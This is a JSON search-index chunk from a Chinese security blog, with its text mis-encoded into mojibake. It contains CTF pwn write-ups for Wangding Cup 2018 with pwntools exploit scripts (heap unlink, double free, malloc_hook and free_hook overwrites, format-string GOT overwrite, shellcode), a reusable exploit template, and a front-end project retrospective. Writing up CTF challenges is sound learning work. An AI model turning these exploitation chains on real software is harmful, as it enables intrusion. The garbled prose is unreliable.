0x602150ï¼Œå¯ä»¥ä»è¿™é‡Œå¼€å§‹ä¼ªé€  2 ä¸ª 0x21 çš„ chunkã€‚è¿™é‡Œå°±æ˜¯é€šè¿‡ ptr[4] æ¥ä¼ªé€ çš„ã€‚ ç„¶åæˆ‘ä»¬é‡Šæ”¾ 0x100 çš„ä¼ªé€  chunkï¼Œè¿™æ ·åœ¨é‡Šæ”¾æ—¶å³è¿›å…¥ unsorted binï¼Œè¦†ç›– ptr[0] å’Œ ptr[1] ä¸º main_arena+88ã€‚é‡Šæ”¾éœ€è¦ç”¨åˆ°ä¸€ä¸ªæŒ‡å‘ 0x602060 çš„æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¹‹å‰åœ¨ ptr[0] å†™å…¥çš„æŒ‡é’ˆã€‚éšåè¿›è¡Œ partial overwriteï¼Œè¦†ç›–æ‰ ptr[0] ä¹Ÿå°±æ˜¯ main_arena+88 çš„æœ€ä½ 1 å­—èŠ‚ä¸º \\x00ï¼Œè¿™æ—¶ ptr[0] å­˜æ”¾çš„å°±æ˜¯ __malloc_hook-0x10 çš„åœ°å€ï¼Œè¿™ä¸€æ­¥æ˜¯ç¼–è¾‘ ptr[2] å¤„æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹å®ç°çš„ã€‚ æ­¤æ—¶å†ç¼–è¾‘ ptr[0] æŒ‡å‘çš„å†…å®¹å³å¯å†™ __malloc_hook ä¸ºåé—¨å‡½æ•°ã€‚ add(0) add(1) free(0) free(1) free(0) fake = 0x602060 fake_next = 0x602150 add(2,p64(fake-0x23)) add(3) add(4) payload = flat('a'*3,0,0x101,fake,0,fake,0,fake_next,0,0) add(5, payload) edit(4,flat(0,0x21,0,0,0,0x21)) free(0) # 0x100 edit(2,'') # \\x00, malloc_hook-0x10 system = 0x4008e3 edit(0,'a'*0x10+p64(system)) sla(':',_add) sla(':',3) ","date":"2020-05-04","objectID":"/wdb2018-pwn/:2:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"ç½‘é¼æ¯ 2018 Pwn","uri":"/wdb2018-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"babyheap æœ¬é¢˜å’Œä¸Šé¢˜æœ‰ç‚¹ç±»ä¼¼ï¼Œåªèƒ½åˆ†é… 0x20 çš„å †å—ï¼Œæ¼æ´ç‚¹ç›¸åŒï¼Œä¸”å¤šäº† show åŠŸèƒ½ã€‚ é¦–å…ˆè€ƒè™‘æ³„éœ² libcï¼Œæˆ‘ä»¬é‡‡ç”¨ä¼ ç»Ÿçš„ unsorted bin æ³„éœ²å¤§æ³•ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬ä¼ªé€  small chunkã€‚ä¸ºäº†ä¼ªé€ è¿™ä¸ª chunkï¼Œé¦–å…ˆè¦æ³„éœ²å †åœ°å€ï¼Œé‚£ä¹ˆè¿ç»­é‡Šæ”¾ 2 ä¸ª fast chunkï¼Œåä¸€ä¸ªçš„ fd å°±ä¼šæŒ‡å‘å‰ä¸€ä¸ª chunk çš„åœ°å€ï¼Œä»è€Œå¯ä»¥æ³„éœ²å †åœ°å€ã€‚å”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯ show åœ¨è¾“å‡ºæ—¶ç”¨çš„ puts é‡åˆ° \\x00 ä¼šæˆªæ–­ï¼Œæ‰€ä»¥è¦æ³¨æ„é‡Šæ”¾é¡ºåºä½¿å¾—æ³„éœ²å‡ºçš„åœ°å€ä¸­ä¸å­˜åœ¨ \\x00 å­—èŠ‚ã€‚ è·å¾—å †åœ°å€ä¹‹åï¼Œåœ¨ chunk0 å†…ä¼ªé€  chunk å¤´é€ æˆå †å—é‡å ï¼Œç„¶åç”³è¯·ä¸¤æ¬¡å°±å¯ä»¥ç”³è¯·åˆ°ä¸€ä¸ª heap+0x20 å¤„çš„ chunkï¼Œé€šè¿‡å†™è¿™ä¸ª chunk æˆ‘ä»¬å¯ä»¥å†™ chunk1 çš„å¤´éƒ¨ï¼Œä½¿å¾—å…¶å¤§å°å˜æˆ 0xa1ã€‚éšåé‡Šæ”¾å³å¯æ³„éœ² libcï¼Œä½†è¿™é‡Œé‡Šæ”¾æ—¶ä¼šæ£€æŸ¥åä¸¤ä¸ª chunk çš„ sizeï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦ç»•è¿‡æ£€æŸ¥ã€‚ ç»•è¿‡çš„æ–¹æ³•æ˜¯ï¼Œä¸æ–­ç”³è¯· chunk ç›´åˆ° 0xa1 è¿™ä¸ª chunk çš„æœ«å°¾ï¼Œæ­¤æ—¶ç”³è¯·åˆ°çš„æ˜¯ chunk4ã€‚å†™å…¥ 0,0x31 ä¼ªé€ ä¸€ä¸ª chunk å¤´ï¼›å†ç”³è¯·ä¸€ä¸ª chunk5ï¼Œå†™å…¥ 0x30,0x30 ä¼ªé€  chunk å¤´ï¼Œä½¿å¾— chunk4 çœ‹èµ·æ¥æ˜¯ç©ºé—²çš„ã€‚è¿™ä¸¤æ­¥å…ˆåšå¥½åå†é‡Šæ”¾ chunk1 æ‰èƒ½é€šè¿‡æ£€æŸ¥ã€‚ è¿™é‡Œè®© chunk4 ç©ºé—²çš„ç›®çš„å°±æ˜¯ä¸ºäº†è§¦å‘ unlink é€ æˆä»»æ„åœ°å€å†™ï¼Œé‚£ä¹ˆæ˜¾ç„¶æˆ‘ä»¬è¿˜éœ€è¦å† chunk4 çš„å†…å®¹é‡Œæ·»åŠ ä¼ªé€ çš„ fd å’Œ bkï¼Œå³ 0x602080-0x18 å’Œ 0x602080-0x10ï¼Œè¿™é‡Œ 0x602080 æ˜¯ ptr[4]ã€‚unlink ä¹‹åï¼Œæˆ‘ä»¬æˆåŠŸä»¤ ptr[4] æŒ‡å‘ ptr[1]ã€‚ç°åœ¨ç¼–è¾‘ chunk4 å³å¯ä¿®æ”¹ ptr[1] ä¸º free_hookï¼Œç„¶åç¼–è¾‘ chunk1 å³å¯è¦†ç›– free_hook ä¸º one_gadgetï¼ˆsystem åŒç†ï¼‰ã€‚ add(0) add(1) add(2) add(3) fd = 0x602080-0x18 bk = 0x602080-0x10 add(4,flat(0,0x31,fd,bk)) add(5,flat(0x30,0x30)) free(1) free(0) show(0) heap = uu64(r(4)) - 0x30 leak('heap',heap) edit(0,flat(heap+0x20,0,0,0x31)) add(6) # 0 add(7,flat(0,0xa1)) # above 1 free(1) show(1) base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10 leak('base',base) free_hook = base + libc.sym['__free_hook'] edit(4,p64(free_hook)) edit(1,p64(base+0x4526a)) free(2) ","date":"2020-05-04","objectID":"/wdb2018-pwn/:3:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"ç½‘é¼æ¯ 2018 Pwn","uri":"/wdb2018-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"easyfmt å¸¸è§„çš„ 32 ä½æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ï¼Œè‡ªåŠ¨åŒ–æµ‹å¾—åç§»ä¸º 6ï¼Œç„¶åæ³„éœ² libcï¼Œè¦†ç›– printf@got ä¸º systemã€‚ ru('?\\n') def exec_fmt(payload): sl(payload) info = r() return info auto = FmtStr(exec_fmt) sl(p32(elf.got['printf']) + '%6$s') r(4) printf = u32(r(4)) leak('printf',printf) base,libc,system = leak_libc('printf',printf) sl(fmtstr_payload(auto.offset, {elf.got['printf']:system})) sl('/bin/sh\\x00') ","date":"2020-05-04","objectID":"/wdb2018-pwn/:4:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"ç½‘é¼æ¯ 2018 Pwn","uri":"/wdb2018-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"fgo å…¥é—¨çº§å †é¢˜ï¼Œç›´æ¥ uaf å³å¯ã€‚è§£æ³•å¯ä»¥å‚è€ƒ hitcontraining_hacknoteã€‚ add(0x20) add(0x20) free(0) free(1) add(0x8,p32(elf.sym['secret'])) show(0) ","date":"2020-05-04","objectID":"/wdb2018-pwn/:5:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"ç½‘é¼æ¯ 2018 Pwn","uri":"/wdb2018-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"soEasy å­˜åœ¨æ ˆæº¢å‡ºï¼Œç»™å‡ºäº†æ ˆåœ°å€ï¼Œchecksec å‘ç° NX å…³é—­ï¼Œå› æ­¤ç›´æ¥å†™å¥½ shellcode ç„¶åè¿”å›åˆ° shellcode åœ°å€å³å¯ã€‚ ru('0x') buf = int(ru('\\n'),16) payload = asm(shellcraft.sh()).ljust(0x4c,'a') + p32(buf) sla('?',payload) ","date":"2020-05-04","objectID":"/wdb2018-pwn/:6:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"ç½‘é¼æ¯ 2018 Pwn","uri":"/wdb2018-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"pesp ç¼–è¾‘æ—¶æ–°çš„ size å¹¶æ²¡æœ‰ä½œæ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥å †æº¢å‡ºã€‚åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹ç©ºé—² fast chunk çš„ fdï¼Œæ‰‹åŠ¨é€ æˆ uafï¼Œå€ŸåŠ©å‡çš„ 0x7f ä¼ªé€  chunk åˆ†é…åˆ° itemlist ä¸Šæ–¹ä»è€Œä¿®æ”¹ itemlist ä¸­çš„å†…å®¹æŒ‡é’ˆè¾¾åˆ°ä»»æ„åœ°å€å†™ï¼Œæ³„éœ² libc åè¦†ç›– atoi ä¸º systemã€‚ fake = 0x6020ad add(0x60) add(0x60) free(1) edit(0,0x100,flat('a'*0x60,0,0x71,fake)) add(0x60) # 1 add(0x60, flat('a'*3, 0x100, elf.got['atoi'])) show() ru(':') atoi = uu64(r(6)) base,libc,system = leak_libc('atoi',atoi,libc) edit(0,0x8,p64(system)) sla(':', '/bin/sh\\x00') ","date":"2020-05-04","objectID":"/wdb2018-pwn/:7:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"ç½‘é¼æ¯ 2018 Pwn","uri":"/wdb2018-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"semifinal_pwn1 æœ¬é¢˜åŠŸèƒ½æ¯”è¾ƒå¤æ‚ï¼Œå…³é”®åœ¨äºè‡ªå·±å¯ä»¥æ·»åŠ è‡ªå·±ä¸ºå¥½å‹ï¼Œç„¶ååˆ é™¤è‡ªå·±æ—¶å°±å¯ä»¥é‡Šæ”¾å†…å­˜ã€‚è€Œæ¯ä¸ªç”¨æˆ·éƒ½ä¼šåˆ†é…ä¸€å— 0x130 çš„ chunkï¼Œé‡Šæ”¾åè¿›å…¥ unsorted binã€‚éšåå°±å¯ä»¥åˆ©ç”¨ uaf æ³„éœ² libc å¹¶å€ŸåŠ© update åŠŸèƒ½è¦†ç›– got è¡¨ã€‚ def reg(size,name): sla('choice:',2) sla(':',size) sla(':',name) sla(':',20) sla(':','desc') def login(name): sla('choice:',1) sla(':',name) def logout(): sla('choice:',6) def add_free(name,choice): sla('choice:',3) sla(':',name) sla('(a/d)', choice) def view_profile(): sla('choice:',1) def edit(name): sla('choice:',2) sa(':', name) sla(':',20) sla(':','desc') reg(8,'a'*6) reg(8,'b'*6) login('b'*6) add_free('b'*6,'a') add_free('b'*6,'d') view_profile() ru('Age:') base = int(ru('\\n'),16)-88-libc.sym['__malloc_hook']-0x10 leak('base',base) puts = base + libc.sym['puts'] logout() reg(0x20, p64(elf.got['puts'])) login(p64(puts)) edit(p64(base+0x4526a)[:-2]) ","date":"2020-05-04","objectID":"/wdb2018-pwn/:8:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"ç½‘é¼æ¯ 2018 Pwn","uri":"/wdb2018-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"semifinal_pwn2 è¿™é¢˜æ¯”è¾ƒæœ‰æ„æ€ï¼Œç¨‹åºæ˜¯ä¸€ä¸ª brainfuck è§£é‡Šå™¨ï¼Œè§„åˆ™æ˜¯ï¼š \u003cï¼š p-- \u003eï¼š p++ .ï¼š putc(*p) ,ï¼š read(0,p,1) +ï¼š *p++ -ï¼š *p-- æ¢å¥è¯è¯´å·²ç»å¯ä»¥æ„é€ ä»»æ„åœ°å€è¯»å†™äº†ï¼Œé‚£ä¹ˆé¦–å…ˆåˆ©ç”¨ä¸Šè¿°è§„åˆ™æ³„éœ² stdin æ¥æ³„éœ² libcï¼Œç„¶åç”¨ one_gadget è¦†ç›– got è¡¨ã€‚ stdin = 0x602090 star = 0x6020c0 exit = elf.got['exit'] payload = '\u003c'*(star-stdin) + '.\u003e.\u003e.\u003e.\u003e.\u003e.\u003e' payload += '\u003c'*(stdin+6-exit) + ',\u003e,\u003e,\u003e,\u003e,\u003e,' sla(':',payload) stdin = uu64(r(6)) base = stdin - libc.sym['_IO_2_1_stdin_'] leak('base',base) one = p64(base + 0xf1147) for i in range(6): s(one[i]) ","date":"2020-05-04","objectID":"/wdb2018-pwn/:9:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"ç½‘é¼æ¯ 2018 Pwn","uri":"/wdb2018-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"semifinal_pwn3 æœ¬é¢˜å½“è¾“å…¥é€‰é¡¹ä¸º 1337 æ—¶ä¼šè°ƒç”¨ä¸€ä¸ªå¥‡æ€ªçš„å‡½æ•°ï¼Œä½†å®é™…ä¸Šç”±äº uaf æ¼æ´çš„å­˜åœ¨è¿™ä¸ªå‡½æ•°å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå°‘è§çš„ clean åŠŸèƒ½ç”¨äºæ¸…é™¤æ‰€æœ‰æŒ‡é’ˆï¼Œè¿™é‡Œæ˜¯ä¸å­˜åœ¨ uaf çš„ã€‚ æˆ‘ä»¬å¯ä»¥ç›´æ¥ unsorted bin æ³„éœ² libcï¼ˆè¿™é‡Œæ˜¯é€šè¿‡ clean åŠŸèƒ½æ¸…æ¥šæŒ‡é’ˆï¼Œé‡æ–°ç”³è¯·åˆ°é‡Šæ”¾çš„ small chunk åæ³„éœ² bkï¼‰ï¼Œç„¶å double free å†™ malloc_hookï¼Œæœ€åæ•…æ„ double free è§¦å‘ malloc_print_errï¼Œè°ƒç”¨ malloc_hookã€‚ def clean(): sla('choice :', 4) add(0x80) add(0x60) add(0x60) free(0) clean() add(0x80) show() ru('a'*8) base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10 leak('base',base) malloc_hook = base + libc.sym['__malloc_hook'] one = base + 0xf02a4 free(1) free(2) free(1) add(0x60,p64(malloc_hook-0x23)) add(0x60) add(0x60) add(0x60,'a'*0x13 + p64(one)) free(0) free(0) # malloc_print_err ","date":"2020-05-04","objectID":"/wdb2018-pwn/:10:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"ç½‘é¼æ¯ 2018 Pwn","uri":"/wdb2018-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"å…¶ä¸­ä» # start åˆ° # end ä¸­é—´çš„éƒ¨åˆ†ä¸ºæ ¸å¿ƒä»£ç ã€‚æœ€è¿‘æ›´æ–°çš„åšå®¢ä¸­ Pwn é¢˜è„šæœ¬çš„ä»£ç ä»…åŒ…å«æ ¸å¿ƒä»£ç ã€‚ ","date":"2020-04-26","objectID":"/pwn-template/:0:0","tags":["Python","æ¨¡ç‰ˆ"],"title":"Pwn è„šæœ¬æ¨¡æ¿","uri":"/pwn-template/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ä¾èµ– å¿…éœ€ pwntools gdb Python 2 / 3 Ubuntu 16.x / 18.x / 19.x éå¿…éœ€ï¼ˆå¯å°†å¯¹åº”åŠŸèƒ½æ³¨é‡Šæ‰ï¼‰ LibcSearcher one_gadget patchelf glibc-all-in-one ","date":"2020-04-26","objectID":"/pwn-template/:1:0","tags":["Python","æ¨¡ç‰ˆ"],"title":"Pwn è„šæœ¬æ¨¡æ¿","uri":"/pwn-template/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"è¯´æ˜ leak_libc å‡½æ•°å¯ä»¥é€‰æ‹©ä½¿ç”¨æŒ‡å®š ELF æ–‡ä»¶æˆ–æ˜¯åˆ©ç”¨ LibcSearcher æœå¯» libc ä½¿ç”¨ä¸åŒäºç³»ç»Ÿç‰ˆæœ¬çš„ libc æ—¶ï¼Œéœ€è¦ç”¨åˆ° patchelf å·¥å…· å¢åˆ æ”¹æŸ¥åŠŸèƒ½çš„åºå·ä»¥åŠå‘é€å†…å®¹çš„é€»è¾‘ï¼Œè¯·æ ¹æ®å…·ä½“é¢˜ç›®ä¿®æ”¹ ä¸»è¦ä»£ç æ”¾åœ¨ # start å’Œ # end ä¹‹é—´ è¿œç¨‹è¿è¡Œæ—¶å¿…é¡»æŒ‡å®š -p é€‰é¡¹ å…¶å®ƒåŠŸèƒ½è¯·è¿è¡Œ python exp.py -h æŸ¥è¯¢ ","date":"2020-04-26","objectID":"/pwn-template/:2:0","tags":["Python","æ¨¡ç‰ˆ"],"title":"Pwn è„šæœ¬æ¨¡æ¿","uri":"/pwn-template/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ä»£ç  from pwn import * from LibcSearcher import LibcSearcher from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter s = lambda data: p.send(str(data)) sa = lambda delim,data: p.sendafter(delim,str(data)) sl = lambda data: p.sendline(str(data)) sla = lambda delim,data: p.sendlineafter(delim,str(data)) r = lambda num=4096: p.recv(num) ru = lambda delims,drop=True: p.recvuntil(delims,drop) uu64 = lambda data: u64(data.ljust(8,'\\0')) leak = lambda name,addr: log.success('{}= {:#x}'.format(name, addr)) def leak_libc(func,addr,elf=None): if elf: libc = elf base = addr-libc.sym[func] leak('base',base) system = base+libc.sym['system'] else: libc = LibcSearcher(func,addr) base = addr-libc.dump(func) leak('base',base) system = base+libc.dump('system') return (base,libc,system) parser = ArgumentParser(formatter_class=ArgumentDefaultsHelpFormatter) parser.add_argument('-b',help='binary file',required=True,metavar='BINARY') parser.add_argument('-r',help='remote host',default='node3.buuoj.cn',metavar='RHOST') parser.add_argument('-p',type=int,help='remote port',metavar='RPORT') parser.add_argument('-l',help='libc - [xx] for v2.xx, or [/path/to/libc.so.6] to load a specific libc',default='23',metavar='LIBC') parser.add_argument('-d',help='disable DEBUG mode',action='store_true') args = parser.parse_args() print(args) binary = args.b context.binary = binary elf = ELF(binary,checksec=False) if not args.d: context.log_level = 'DEBUG' path_dict = { '23': '/lib/x86_64-linux-gnu/libc.so.6', '27': './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so', '29': './glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so' } libc_path = path_dict.get(args.l, args.l) libc = ELF(libc_path,checksec=False) if args.p: p = remote(args.r, args.p) else: p = process(binary,env={'LD_PRELOAD':libc_path}) def dbg(): gdb.attach(p) pause() _add,_free,_edit,_show = 1,4,2,3 def add(index,content='a'*8): sla(':',_add) sla(':',index) sa(':',content) def free(index): sla(':',_free) sla(':',index) def edit(index,content): sla(':',_edit) sla(':',index) sa(':',content) def show(index): sla(':',_show) sla(':',index) # start # end p.interactive() ","date":"2020-04-26","objectID":"/pwn-template/:3:0","tags":["Python","æ¨¡ç‰ˆ"],"title":"Pwn è„šæœ¬æ¨¡æ¿","uri":"/pwn-template/"},{"categories":["å‰ç«¯"],"content":"åŸºæœ¬å‘Šåˆ«å¼€å‘äº†ã€‚ åˆä¸€å¹´åŒåˆ›ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåˆæŠ¥äº†ï¼Œç°åœ¨æƒ³æ¥åæ‚”ä¸å·²ï¼Œä½†ä¹Ÿä¸æ˜¯å…¨æ— æ”¶è·ã€‚ ","date":"2020-04-11","objectID":"/swingmood/:0:0","tags":["é¡¹ç›®"],"title":"SwingMood é¡¹ç›®å®è·µå¿ƒå¾—","uri":"/swingmood/"},{"categories":["å‰ç«¯"],"content":"æŠ€æœ¯ æŠ€æœ¯ä¸Šï¼Œç»è¿‡ä¸€å¤©é’¢é“è¿™ç±»å•†ä¸šé¡¹ç›®çš„é”»ç‚¼ï¼ŒQuasar+Webpack+Vue å…¨å®¶æ¡¶å·²ç»ç”¨å¾—æ¯”è¾ƒç†Ÿäº†ï¼ŒSwingMood å¼€å‘è¿‡ç¨‹ä¸­æ›´å¤šæ˜¯å› ä¸ºè¦é€‚é…ç§»åŠ¨ç«¯ï¼Œè¿›ä¸€æ­¥åŠ æ·±äº†å¯¹ flexbox çš„ç†è§£ã€‚ æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯åœ¨é¡¹ç›®è¿›è¡Œæ—¶æˆ‘åŒæ—¶ä¹Ÿåœ¨å®ä¹ ï¼Œè¿›è¡Œä¸€äº›æ¸—é€æµ‹è¯•çš„å·¥ä½œã€‚æ¸—é€è¿‡ç¨‹ä¸­ï¼Œç”²æ–¹å¼€å‘ç”¨äº†ä¸€ç§å¾ˆè ¢çš„æ–¹å¼è¿›è¡Œä¼šè¯ç®¡ç†ï¼šä½¿ç”¨ IP æ ‡è¯†ä¸€ä¸ªè´¦æˆ·ã€‚è¿™å¯¹äºæ”»å‡»è€…æ¥è¯´ç®€ç›´æ˜¯å¤©å¤§çš„ç¦éŸ³ï¼Œå› æ­¤æˆ‘ä»¬ä¸ç¦å»è´¨è¯¢å¼€å‘ä¸ºä»€ä¹ˆè¦è¿™æ ·åšï¼Œå¾—åˆ°äº†å¦‚ä¸‹å›ç­”ï¼š å‰ç«¯é‡‡ç”¨äº† axios å‘èµ·å¼‚æ­¥è¯·æ±‚ï¼Œåç«¯æœ¬æ¥é‡‡ç”¨ session è¿›è¡Œä¼šè¯ç®¡ç†ï¼Œè¿™éœ€è¦å‰ç«¯å‘èµ·è¯·æ±‚æ—¶å¸¦ä¸Š Cookieã€‚ä½†å½“è®¾ç½® withCredential ä¸º true æ—¶ï¼Œåç«¯å¿…é¡»è®¾ç½® Access-Control-Allow-Credentials å¤´ï¼›è¿™æ—¶ï¼ŒAccess-Control-Allow-Origin å¤´å¿…é¡»æ˜¯ä¸€ä¸ªæŒ‡å®šçš„æºï¼Œä¸èƒ½ä¸º *ã€‚äºæ˜¯æˆ‘ä»¬åªèƒ½å–æ¶ˆäº† session æœºåˆ¶ã€‚ ç„¶è€Œæ­£ç¡®çš„åšæ³•æ˜¯æŒ‡å®š Access-Control-Allow-Origin å¤´ä¸ºä¸€ä¸ªæˆ–ä¸€ç»„ç‰¹å®šçš„æºï¼Œä¾‹å¦‚ http://localhost:8080 ç­‰ã€‚å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¯ä»¥æŒ‡å®šä¸ºå‰ç«¯é¡µé¢æ‰€åœ¨çš„æºï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ç»™å‡ºçš„ä¿®å¤å»ºè®®ã€‚å®é™…ä¸Šï¼Œåœ¨ SwingMood å¼€å‘è¿‡ç¨‹ä¸­æˆ‘å°±é‡åˆ°äº†å®Œå…¨ç›¸åŒçš„é—®é¢˜ï¼Œå‰ç«¯å¼€å‘ç»éªŒæ€»ç®—æ´¾ä¸Šäº†ç‚¹ç”¨åœºã€‚ å‰©ä¸‹çš„æ˜¯ä¸€äº›æŠ€æœ¯ä¸Šçš„å°è¿›æ­¥ï¼š å¤„ç†è·¨åŸŸé—®é¢˜æ—¶ï¼Œæœ€æ–¹ä¾¿çš„æ–¹æ³•æ˜¯ç›´æ¥ä½¿ç”¨ webpack çš„å¼€å‘æœåŠ¡å™¨ä»£ç†ï¼Œå°† changeOrigin è®¾ç½®ä¸º true axios ä¸­å¯¹åç«¯è¿”å›æ•°æ®çš„å¤„ç†ï¼Œæ¯”è¾ƒæ–¹ä¾¿çš„æ–¹æ³•æ˜¯æ·»åŠ æ‹¦æˆªå™¨å¯¹ res.data.code è¿›è¡Œæ£€æŸ¥ æ·±å…¥å­¦ä¹ å¹¶ç†è§£äº† Vue ç”Ÿå‘½å‘¨æœŸé’©å­çš„è°ƒç”¨é¡ºåº å¯¹äºéœ€è¦ç™»å½•æ‰å¯ä»¥è®¿é—®çš„é¡µé¢ï¼Œæœ€æ–¹ä¾¿çš„å¤„ç†æ–¹æ³•æ˜¯åˆ©ç”¨ VuerRouter çš„ beforeEach æ–¹æ³•ï¼Œæ£€æŸ¥é¡µé¢çš„è‡ªå®šä¹‰å±æ€§ ä¸ºäº†è§£å†³é¡µé¢åˆ·æ–°ä¸¢å¤± session çš„é—®é¢˜ï¼Œå¯ä»¥ç›‘å¬ beforeunload æ–¹æ³•å°† Vuex çš„ state å­˜å…¥ sessionStorageï¼Œå¹¶åœ¨é¡µé¢åŠ è½½æ—¶å–å‡ºã€‚ ç”±æ­¤å¯ä»¥çœ‹å‡ºæˆ‘çš„ Vue æŠ€æœ¯è¿˜æœ‰å¾…æé«˜ï¼Œå¯¹åº•å±‚åŸç†çš„ç†è§£å°šä¸åˆ°ä½ã€‚ ","date":"2020-04-11","objectID":"/swingmood/:1:0","tags":["é¡¹ç›®"],"title":"SwingMood é¡¹ç›®å®è·µå¿ƒå¾—","uri":"/swingmood/"},{"categories":["å‰ç«¯"],"content":"ç®¡ç† åœ¨è¿™æ¬¡é¡¹ç›®è¿‡ç¨‹ä¸­æˆ‘ä½œä¸ºç»„é•¿ï¼Œéœ€è¦åè°ƒå¥½å„é˜Ÿå‘˜é—´çš„å·¥ä½œã€‚å¯¹äºè¿™ç±»ä»»åŠ¡æˆ‘å¹¶æ²¡æœ‰ä»€ä¹ˆç»éªŒï¼Œå› æ­¤è¿™æ¬¡åšå¾—ä¸æ˜¯ç‰¹åˆ«å¥½ï¼Œå¯¼è‡´é¡¹ç›®è¿›åº¦è€½è¯¯äº†ä¸€äº›ã€‚ ä¸‹é¢å…³äºé¡¹ç›®æµç¨‹çš„ä¸€äº›è®°å½•ï¼Œä»¥åæ˜ ç¿»è½¦çš„å…·ä½“åŸå› ï¼š é¡¹ç›®åˆæœŸï¼Œæˆ‘æŒ‰å„äººæ„æ„¿åˆ†é…äº†ä»»åŠ¡ å¿ƒç†åŒå­¦ * 2ï¼šé˜…è¯»æ–‡çŒ®ã€æä¾›ç†è®ºæ”¯æ’‘ ç†Ÿæ‚‰å‰ç«¯çš„åŒå­¦ Aï¼šå†™åç«¯ï¼ˆï¼Ÿï¼‰ ç†Ÿæ‚‰åç«¯çš„åŒå­¦ Bï¼šå†™å‰ç«¯ï¼ˆï¼Ÿï¼‰ æˆ‘å®Œæˆäº† app æ•´ä½“ç•Œé¢æ¡†æ¶ï¼Œç”¨æ—¶ 3 å¤© A æå‡ºæƒ³é‡‡ç”¨ protobuf + grpc æ„å»ºåç«¯ï¼Œç”±äºé¡¹ç›®æœ¬æ¥å°±æ˜¯ä¸ºäº†å­¦ä¹ æ–°çŸ¥è¯†ï¼Œæˆ‘åŒæ„äº† ç»™ B å®‰æ’å‰ç«¯å­¦ä¹ è®¡åˆ’ å’Œ A ä¸€èµ·è°ƒè¯•å¥‡æ€ªçš„ Golang ä¸“å±é—®é¢˜ ä¸­é—´å¤§çº¦ 2 ä¸ªæœˆçš„æ—¶é—´å•¥ä¹Ÿæ²¡å¹² å¿«ç­”è¾©äº†ï¼Œå’Œå¿ƒç†çš„åŒå­¦æ˜ç¡®éœ€æ±‚ï¼Œä¿®æ”¹å‰ç«¯ç•Œé¢ï¼Œå‚¬åç«¯ ç»ˆäºå‘ç°ğŸ’Šï¼Œäº’æ¢ A/B å·¥ä½œ åç«¯å˜å› Spring äº†ï¼Œä¸ºäº†åŠ é€Ÿ B çš„è¿›åº¦æˆ‘ç”šè‡³å†™äº†ä¸å°‘ Java ä»£ç ï¼ˆï¼Ÿï¼‰ åç«¯å¼€å‘åŸºæœ¬å®Œæˆï¼Œå¤§æ¦‚ç”¨æ—¶ 1 å‘¨å¤šä¸€ç‚¹ï¼ˆï¼Ÿï¼‰ è®©å¿ƒç†åŒå­¦æ”¶é›†ç´ æï¼Œç»§ç»­å®Œå–„å‰åç«¯ å¼€å‘å®Œæˆï¼Œæ‰“åŒ…é‡åˆ°é—®é¢˜ï¼Œåˆè°ƒè¯• 3 å¤© æå®šï¼Œå†™æŠ¥å‘Šï¼Œæäº¤ æ‰€ä»¥è¯´ä½œä¸ºç®¡ç†è€…æˆ‘æ˜¯è¦èƒŒå¾ˆå¤§çš„é”…çš„ã€‚ã€‚å›é¡¾æ•´ä¸ªé¡¹ç›®æµç¨‹ï¼Œæˆ‘æ„Ÿåˆ°ååˆ†è¿·æƒ‘ã€‚æˆ‘è§‰å¾—ä»Šååœ¨è¿›è¡Œä»»åŠ¡åˆ†é…æ—¶ï¼Œåº”åšåˆ°ï¼š åˆç†åˆ†é…ï¼Œå³å°½é‡æ ¹æ®é˜Ÿå‘˜æ‰€æ“…é•¿çš„æ–¹é¢æ¥åˆ†é…å¯¹åº”çš„ä»»åŠ¡ è®¾å®šä¸¥æ ¼çš„äº¤ä»˜æ—¶é—´ï¼Œä»¥é˜²æ­¢å‡ºç°æ‹–å»¶çš„æƒ…å†µ 